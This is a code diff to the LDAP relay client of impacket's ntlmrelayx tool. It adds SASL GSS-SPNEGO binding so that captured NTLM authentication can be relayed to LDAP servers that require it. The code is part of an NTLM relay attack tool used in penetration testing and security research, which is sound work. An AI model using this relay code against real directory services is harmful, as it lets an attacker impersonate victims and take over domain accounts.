@@ -25,15 +25,16 @@ from impacket import LOG
 from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
 from ldap3.operation import bind
 try:
-    from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
+    from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED, RESULT_SASL_BIND_IN_PROGRESS
 except ImportError:
     LOG.fatal("ntlmrelayx requires ldap3 > 2.0. To update, use: 'python -m pip install ldap3 --upgrade'")
     sys.exit(1)
 
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
+from impacket.ldap.ldap import BindRequest
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
 from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
-from impacket.spnego import SPNEGO_NegTokenResp
+from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 
 PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]
 
@@ -44,7 +45,7 @@ class LDAPRelayClient(ProtocolClient):
     PLUGIN_NAME = "LDAP"
     MODIFY_ADD = MODIFY_ADD
 
-    def __init__(self, serverConfig, target, targetPort = 389, extendedSecurity=True ):
+    def __init__(self, serverConfig, target, targetPort = 389, extendedSecurity=True):
         ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
         self.extendedSecurity = extendedSecurity
         self.negotiateMessage = None
@@ -84,25 +85,46 @@ class LDAPRelayClient(ProtocolClient):
         with self.session.connection_lock:
             if not self.session.sasl_in_progress:
                 self.session.sasl_in_progress = True
-                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
-                response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
-                result = response[0]
-                try:
-                    sicily_packages = result['server_creds'].decode('ascii').split(';')
-                except KeyError:
-                    raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)
-
-                if 'NTLM' in sicily_packages:  # NTLM available on server
-                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
+                if not self.serverConfig.usesaslgssapi:
+                    request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                     response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                     result = response[0]
-                    if result['result'] == RESULT_SUCCESS:
+                    try:
+                        sicily_packages = result['server_creds'].decode('ascii').split(';')
+                    except KeyError:
+                        raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)
+
+                    if 'NTLM' in sicily_packages:  # NTLM available on server
+                        request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
+                        response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
+                        result = response[0]
+                        if result['result'] == RESULT_SUCCESS:
+                            challenge = NTLMAuthChallenge()
+                            challenge.fromString(result['server_creds'])
+                            self.sessionData['CHALLENGE_MESSAGE'] = challenge
+                            return challenge
+                    else:
+                        raise LDAPRelayClientException('Server did not offer NTLM authentication!')
+                else:
+                    SPNEGO_wrapped_negotiateMessage = SPNEGO_NegTokenInit()
+                    SPNEGO_wrapped_negotiateMessage['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
+                    SPNEGO_wrapped_negotiateMessage['MechToken'] = self.negotiateMessage
+
+                    bindRequest = BindRequest()
+                    bindRequest['version'] = 3
+                    bindRequest["name"] = b""
+                    bindRequest['authentication']['sasl']['mechanism'] = 'GSS-SPNEGO'
+                    bindRequest['authentication']['sasl']['credentials'] = SPNEGO_wrapped_negotiateMessage.getData()
+
+                    req = self.session.send('bindRequest', bindRequest, None)
+                    response = self.session.post_send_single_response(req)
+                    result = response[0]
+                    if result['result'] == RESULT_SASL_BIND_IN_PROGRESS:
+                        SPNEGO_wrapped_challenge = SPNEGO_NegTokenResp(result['saslCreds'])
                         challenge = NTLMAuthChallenge()
-                        challenge.fromString(result['server_creds'])
+                        challenge.fromString(SPNEGO_wrapped_challenge['ResponseToken'])
                         self.sessionData['CHALLENGE_MESSAGE'] = challenge
                         return challenge
-                else:
-                    raise LDAPRelayClientException('Server did not offer NTLM authentication!')
 
     #This is a fake function for ldap3 which wants an NTLM client with specific methods
     def create_negotiate_message(self):
@@ -135,8 +157,18 @@ class LDAPRelayClient(ProtocolClient):
 
         with self.session.connection_lock:
             self.authenticateMessageBlob = token
-            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
-            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
+            if not self.serverConfig.usesaslgssapi:
+                bindRequest = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
+            else:
+                SPNEGO_wrapped_negotiateMessage = SPNEGO_NegTokenResp()
+                SPNEGO_wrapped_negotiateMessage['ResponseToken'] = token
+
+                bindRequest = BindRequest()
+                bindRequest['version'] = 3
+                bindRequest["name"] = b""
+                bindRequest['authentication']['sasl']['mechanism'] = 'GSS-SPNEGO'
+                bindRequest['authentication']['sasl']['credentials'] = SPNEGO_wrapped_negotiateMessage.getData()
+            response = self.session.post_send_single_response(self.session.send('bindRequest', bindRequest, None))
             result = response[0]
         self.session.sasl_in_progress = False
 
